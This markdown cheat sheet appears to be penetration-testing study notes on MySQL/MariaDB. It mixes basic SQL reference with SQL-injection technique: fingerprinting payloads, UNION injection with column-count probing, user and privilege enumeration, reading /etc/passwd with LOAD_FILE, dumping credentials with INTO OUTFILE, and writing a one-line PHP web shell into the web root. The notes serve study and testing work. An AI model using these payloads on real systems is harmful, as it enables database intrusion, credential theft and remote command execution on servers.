### Content

- [MySQL Fingerprinting](#mysql-fingerprinting)
- [Enumerating Users and Their Rights](#enumerating-users-and-their-rights)
- [Enumerating the DBMS](#enumerating-the-dbms)
- [Adding Records to DB or Create a DB](#adding-records-to-db-or-create-a-db)
- [Retrieve Data from the DB](#retrieve-data-from-the-db)
- [UNION Clause](#union-clause)
- [Editing the DB](#editing-the-db)
- [INFORMATION_SCHEMA Database](#information_schema-database)
	- [Schemata Table](#schemata-table)
	- [Tables table](#tables-table)
	- [Columns Table](#columns-table)
- [Files Operations](#files-operations)

> [!Note]
> A list of common operations and their precedence, as seen in the [MariaDB Documentation](https://mariadb.com/kb/en/operator-precedence/):
> - Division (`/`), Multiplication (`*`), and Modulus (`%`)
> - Addition (`+`) and subtraction (`-`)
> - Comparison (`=`, `>`, `<`, `<=`, `>=`, `!=`, `LIKE`)
> - NOT (`!`)
> - AND (`&&`)
> - OR (`||`)

---
#### MySQL Fingerprinting

| Payload            | When to Use                      | Expected Output                                     | Wrong Output                                              |
| ------------------ | -------------------------------- | --------------------------------------------------- | --------------------------------------------------------- |
| `SELECT @@version` | When we have full query output   | MySQL Version 'i.e. `10.3.22-MariaDB-1ubuntu1`'     | In MSSQL it returns MSSQL version. Error with other DBMS. |
| `SELECT POW(1,1)`  | When we only have numeric output | `1`                                                 | Error with other DBMS                                     |
| `SELECT SLEEP(5)`  | Blind/No Output                  | Delays page response for 5 seconds and returns `0`. | Will not delay response with other DBMS                   |

---
### Enumerating Users and Their Rights

```SQL
-- Display the current user
mysql> SELECT USER();
-- Dispaly the current user%host
mysql> SELECT CURRENT_USER();
-- Display all the users in the DBMS
mysql> SELECT user from mysql.user;
-- See if the user have super privileges
mysql> SELECT super_priv, user FROM mysql.user;
mysql> SELECT super_priv, user FROM mysql.user WHERE user='CurrentUser';
-- See Which user granted which privileges
mysql> SELECT grantee,privilege_type FROM information_schema.user_privileges;
```

---
#### Enumerating the DBMS

```sql
-- Display the current DMBS version
mysql> SELECT @@version;

-- Display the current DB
mysql> SELECT database();
-- Display the avaialbe users on the DBMS
mysql> SELECT user FROM mysql.user;

-- Create a DB
mysql> CREATE DATABASE users;

-- Show DBs names
mysql> SHOW DATABASES;
mysql> SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;

-- Use a specific DB
mysql> USE users;

-- Show the DB tables
mysql> SHOW TABLES;
mysql> SELECT table_name, table_schema FROM INFORMATION_SCHEMA.TABLES WHERE table_schema = 'db_name';

-- View table column names
mysql> DESCRIBE logins;
mysql> SELECT column_name, table_name, table_schema from information_schema.columns WHERE table_name='table_name';
```

---
#### Adding Records to DB or Create a DB

```SQL
-- CREATE
mysql> CREATE TABLE logins (
    ->     id INT NOT NULL AUTO_INCREMENT,
    ->     username VARCHAR(100) UNIQUE NOT NULL,
    ->     password VARCHAR(100) NOT NULL,
    ->     date_of_joining DATETIME DEFAULT NOW(),
    ->     PRIMARY KEY (id)
    ->     );

-- INSERT
mysql> INSERT INTO logins VALUES(1, 'admin', 'p@ssw0rd', '2020-07-02');
-- Insert only required data and let the rest be set automatically
mysql> INSERT INTO logins(username, password) VALUES('administrator', 'adm1n_p@ss');
-- Insert multiple cells at a time
mysql> INSERT INTO logins(username, password) VALUES ('john', 'john123!'), ('tom', 'tom123!');
```

---
#### Retrieve Data from the DB

```SQL
-- SELECT
-- show all rows from a tabel
mysql> SELECT * FROM logins;
-- Select rows in a different db than the used one
SELECT * FROM db_name.table_name;
-- Show specific colums from a table
mysql> SELECT username,password FROM logins;
-- Sort the ouput according to a column (ASC by default) 
mysql> SELECT * FROM logins ORDER BY password;
-- Sort according to multiple columns
mysql> SELECT * FROM logins ORDER BY password DESC, id ASC;
-- Limit the number of records retrieved
mysql> SELECT * FROM logins LIMIT 2;
-- (Create an offset)skip 1 row and get the next 2 records
mysql> SELECT * FROM logins LIMIT 1, 2;
-- Apply a condition using WHERE
mysql> SELECT * FROM logins WHERE id > 1;
mysql> SELECT * FROM logins where username = 'admin';
mysql> SELECT * FROM logins WHERE username LIKE 'admin%';
-- matches all usernames with exactly three characters in them
mysql> SELECT * FROM logins WHERE username like '___';
mysql> SELECT * FROM logins WHERE username != 'john';
mysql> SELECT * FROM logins WHERE username != 'john' AND id > 1; -- || && !
```

---
#### UNION Clause

```SQL
-- UNION
-- The data types of the selected columns on all positions should be the same.
-- Operate on SELECT statements with an equal number of columns.
mysql> SELECT * FROM ports UNION SELECT * FROM ships;

-- Un-even Columns
-- Put junk data for the remaining required columns so that the total number of columns we are UNIONing with remains the same as the original query.
-- junk data can be 'NULL', numbers or words. ('NULL' fits all data types.) 
SELECT * from products where product_id = '1' UNION SELECT username, 2 from passwords
select * from employees UNION select dept_no, dept_name, NULL, NULL, NULL, NULL from departments;

-- Detect number of columns
--> Using ORDER BY
-- order by 1 will sort by the first column, Then we will do order by 2 and then order by 3 until we reach a number that returns an error.
--> Using UNION
-- attempt a Union injection with a different number of columns until we successfully get the results back. (' UNION select 1,2,3-- -)
```

---
#### Editing the DB

```SQL
-- DROP
-- Remove the entire table from the DB
mysql> DROP TABLE logins;

-- ALTER
-- Add a column to the table
mysql> ALTER TABLE logins ADD newColumn INT;
-- Rename a column
mysql> ALTER TABLE logins RENAME COLUMN newColumn TO newerColumn;
-- Modify a column datatype  
mysql> ALTER TABLE logins MODIFY newerColumn DATE;
-- Remove a specific column from the tabel
mysql> ALTER TABLE logins DROP newerColumn;

-- UPDATE
-- Change values in a specific column
mysql> UPDATE logins SET password = 'change_password' WHERE id > 1;
```

---
### INFORMATION_SCHEMA Database

The [INFORMATION_SCHEMA](https://dev.mysql.com/doc/refman/8.0/en/information-schema-introduction.html) database contains metadata about the databases and tables present on the server.

##### Schemata Table

The table [SCHEMATA](https://dev.mysql.com/doc/refman/8.0/en/information-schema-schemata-table.html) in the `INFORMATION_SCHEMA` database contains information about all databases on the server. The `SCHEMA_NAME` column contains all the database names currently present.

```SQL
MariaDB [(none)]> use information_schema;

MariaDB [information_schema]> describe SCHEMATA;
+----------------------------+---------------+------+-----+---------+-------+
| Field                      | Type          | Null | Key | Default | Extra |
+----------------------------+---------------+------+-----+---------+-------+
| CATALOG_NAME               | varchar(512)  | NO   |     | NULL    |       |
| SCHEMA_NAME                | varchar(64)   | NO   |     | NULL    |       |
| DEFAULT_CHARACTER_SET_NAME | varchar(32)   | NO   |     | NULL    |       |
| DEFAULT_COLLATION_NAME     | varchar(32)   | NO   |     | NULL    |       |
| SQL_PATH                   | varchar(512)  | YES  |     | NULL    |       |
| SCHEMA_COMMENT             | varchar(1024) | NO   |     | NULL    |       |
+----------------------------+---------------+------+-----+---------+-------+

MariaDB [information_schema]> SELECT SCHEMA_NAME FROM SCHEMATA;
+--------------------+
| SCHEMA_NAME        |
+--------------------+
| information_schema |
| employees          |
| sys                |
| mysql              |
| performance_schema |
+--------------------+
```

> [!Note]
> 
>  The `information_schema`, `sys`, `mysql`, `performance_schema` databases are default MySQL databases and are present on any server, so we usually ignore them during DB enumeration.

##### Tables table

The [TABLES](https://dev.mysql.com/doc/refman/8.0/en/information-schema-tables-table.html) table contains information about all tables throughout the database. This table contains multiple columns, but we are interested in the `TABLE_SCHEMA` and `TABLE_NAME` columns. The `TABLE_NAME` column stores table names, while the `TABLE_SCHEMA` column points to the database each table belongs to.

```SQL
MariaDB [information_schema]> SELECT table_name, table_schema FROM INFORMATION_SCHEMA.TABLES WHERE table_schema = 'employees';
+----------------------+--------------+
| table_name           | table_schema |
+----------------------+--------------+
| titles               | employees    |
| dept_emp_latest_date | employees    |
| dept_manager         | employees    |
| departments          | employees    |
| current_dept_emp     | employees    |
| employees            | employees    |
| salaries             | employees    |
| dept_emp             | employees    |
+----------------------+--------------+
```

##### Columns Table

The [COLUMNS](https://dev.mysql.com/doc/refman/8.0/en/information-schema-columns-table.html) table contains information about all columns present in all the databases. This helps us find the column names to query a table for. The `COLUMN_NAME`, `TABLE_NAME`, and `TABLE_SCHEMA` columns can be used to achieve this.

```SQL
MariaDB [information_schema]> SELECT column_name, table_name, table_schema from information_schema.columns WHERE table_name='d
ept_manager';
+-------------+--------------+--------------+
| column_name | table_name   | table_schema |
+-------------+--------------+--------------+
| emp_no      | dept_manager | employees    |
| dept_no     | dept_manager | employees    |
| from_date   | dept_manager | employees    |
| to_date     | dept_manager | employees    |
+-------------+--------------+--------------+
```

##### Global Variable Table

The [global_variables](https://dev.mysql.com/doc/refman/5.7/en/information-schema-variables-table.html) table has the `MySQL` global variables stored in it, this table has two columns `variable_name` and `variable_value`.

```SQL
MariaDB [(none)]> SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv";
+------------------+----------------+
| variable_name    | variable_value |
+------------------+----------------+
| SECURE_FILE_PRIV |                |
+------------------+----------------+
```

---

### Files Operations

`FILE` permission may enable us to read files and potentially even write files.

```SQL
mysql> SELECT grantee,privilege_type FROM information_schema.user_privileges WHERE privilege_type='FILE';

+--------------------+----------------+
| grantee            | privilege_type |
+--------------------+----------------+
| 'root'@'localhost' | FILE           |
| 'root'@'%'         | FILE           |
+--------------------+----------------+
```

[secure_file_priv](https://mariadb.com/kb/en/server-system-variables/#secure_file_priv) variable is used to determine where to read/write files from.

- **Empty value** lets us read files from and write on the entire file system.
- **A certain directory is set**, we can only read from the folder specified by the variable.
- **NULL** means we cannot read/write from any directory.

> [!Notes]
> - MariaDB has this variable set to empty by default, which lets us read/write to any file if the user has the FILE privilege.
> - `MySQL` uses `/var/lib/mysql-files` as the default folder.


```SQL
mysql> SHOW VARIABLES LIKE 'secure_file_priv';
-- OR
mysql> SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv";
```

### Reading Files

The [LOAD_FILE()](https://mariadb.com/kb/en/load_file/) function can be used in MariaDB / MySQL to read data from files. The function takes in just one argument, which is the file name.

```SQL
SELECT LOAD_FILE('/etc/passwd');
```

> [!Important]
> In case of reading the source code, which by default located in the path `/var/html/www/` using the `LOAD_FILE()` function, the page ends up rendering the HTML code within the browser. 
> 
> You can see the results by viewing the page source code.

### Writing Files

To be able to write files to the back-end server using a MySQL database, we require three things:

1. User with `FILE` privilege enabled
2. MySQL global `secure_file_priv` variable not enabled
3. Write access to the location we want to write to on the back-end server

The [SELECT INTO OUTFILE](https://mariadb.com/kb/en/select-into-outfile/) statement can be used to write data from select queries into files. This is usually used for exporting data from tables.

```SQL
SELECT * from users INTO OUTFILE '/tmp/credentials';
SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
SELECT 'file written successfully!' INTO OUTFILE '/var/www/html/proof.txt'

-- Writing a web shell
SELECT "",'<?php system($_REQUEST[0]); ?>', "", "" INTO OUTFILE '/var/www/html/shell.php';
```

> [!Important]
> Advanced file exports utilize the `'FROM_BASE64("base64_data")'` function in order to be able to write long/advanced files, including binary data.
> 
> To write a web shell, we must know the base web directory for the web server (Web Root)
> - One way to find it is to use `load_file` to read the server configuration
> 	- Apache's configuration: `/etc/apache2/apache2.conf`
> 	- Nginx's configuration: `/etc/nginx/nginx.conf`
> 	- IIS configuration: `%WinDir%\System32\Inetsrv\Config\ApplicationHost.config`
> - Also use [this wordlist for Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) or [this wordlist for Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt) or use server errors displayed to us and try to find the web directory that way.

---